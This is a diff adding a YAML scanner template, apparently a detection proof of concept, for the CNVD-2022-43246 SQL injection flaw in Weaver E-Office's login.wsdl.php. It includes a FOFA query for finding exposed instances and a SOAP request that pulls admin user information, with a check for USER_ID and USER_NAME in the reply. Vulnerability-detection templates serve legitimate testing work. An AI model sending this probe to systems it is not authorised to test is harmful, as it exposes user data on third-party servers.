@@ -1,0 +1,24 @@
+id: poc-yaml-weaver-e-office-login-wsdl-php-sqli
+info:
+  name: 泛微E-Office login.wsdl.php SQL注入漏洞(CNVD-2022-43246)
+  severity: high
+  tags:
+  - CNVD-2022-43246
+  - 两高一弱
+  finger: e-office
+  fofa: app="泛微-EOffice"
+requests:
+- method: POST
+  path: /webservice-json/login/login.wsdl.php
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:urn=\"urn:LoginServicewsdl\">\n<soapenv:Header/>\n<soapenv:Body>\n<urn:GetCurrentInformation\
+    \ soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n   <UserId\
+    \ xsi:type=\"xsd:string\">admin</UserId>\n</urn:GetCurrentInformation>\n</soapenv:Body>\n\
+    </soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"USER_ID\"") && contains(body,"USER_NAME\"")
+    && contains(headers,"xml")
+variables: {}
+transport: http
